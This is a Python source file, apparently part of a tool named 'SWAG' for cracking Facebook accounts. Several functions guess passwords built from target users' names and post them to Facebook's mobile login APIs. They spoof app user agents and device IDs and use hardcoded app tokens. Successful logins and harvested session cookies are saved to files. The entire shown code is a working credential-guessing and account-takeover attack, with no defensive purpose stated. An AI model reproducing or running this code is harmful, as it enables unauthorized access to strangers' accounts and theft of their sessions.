                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':uaaax(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+coki)
                                        open('/sdcard/SWAG-FILE-M3-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r{M}❲SWAG-CP❳ '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#__________________[ FILE METHOD M4 ]__________________#
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{R}❲{A}SWAG-M4{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳{A}-{R}❲{A}CP:%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
                                "format": "json",
                                "device_id": str(uuid.uuid4()),
                                "cpl": "true",
                                "family_device_id": str(uuid.uuid4()),
                                "credentials_type": "device_based_login_password",
                                "error_detail_type": "button_with_disabled",
                                "source": "device_based_login",
                                "email": ids,
                                "password": pas,
                                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "generate_session_cookies": "1",
                                "meta_inf_fbmeta": "",
                                "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                                "currently_logged_in_userid": "0",
                                "locale": "en_US",
                                "client_country_code": "US",
                                "method": "auth.login",
                                "fb_api_req_friendly_name": "authenticate",
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                "api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': uaaax(),
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': '25227',
                                'X-FB-SIM-HNI': '29752',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+coki)
                                        open('/sdcard/SWAG-FILE-M4-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r{M}❲SWAG-CP❳ '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________[ RANDOM METHOD M1 ]__________________#
def swag1(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{R}❲{A}SWAG-M1{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳ '%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': uax(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                kids = requests.get(f"https://graph.facebook.com/"+ids+"/picture?type=normal").text
                if "Photoshop" in kids:
                	print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+kuki)
                linex()
                open('/sdcard/SWAG-RANDOM-M1-OK.txt','a').write(ids+'|'+pas+ ' | ' +kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ RANDOM METHOD M2 ]__________________#
def swag2(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{R}❲{A}SWAG-M2{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳ '%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':"[FBAN/FB4A;FBAV/251.0.0.9.114;FBBV/881311182;FBDM/{density=2.2,width=1080,height=1486};FBLC/lt_LT;FBRV/648356300;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                kids = requests.get(f"https://graph.facebook.com/"+ids+"/picture?type=normal").text
                if "Photoshop" in kids:
                	print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+kuki)
                linex()
                open('/sdcard/SWAG-RANDOM-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ RANDOM METHOD M2 ]__________________#
def swag3(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{R}❲{A}SWAG-M3{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳ '%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US",
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"eb2c67d09c80f92abacdb7adaefa8ffc"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head={
            "User-Agent": "[FBAN/FB4A;FBAV/251.0.0.9.114;FBBV/881311182;FBDM/{density=2.2,width=1080,height=1486};FBLC/lt_LT;FBRV/648356300;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
            "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                kids = requests.get(f"https://graph.facebook.com/"+ids+"/picture?type=normal").text
                if "Photoshop" in kids:
                	print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+kuki)
                linex()
                open('/sdcard/SWAG-RANDOM-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ END ]__________________#
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()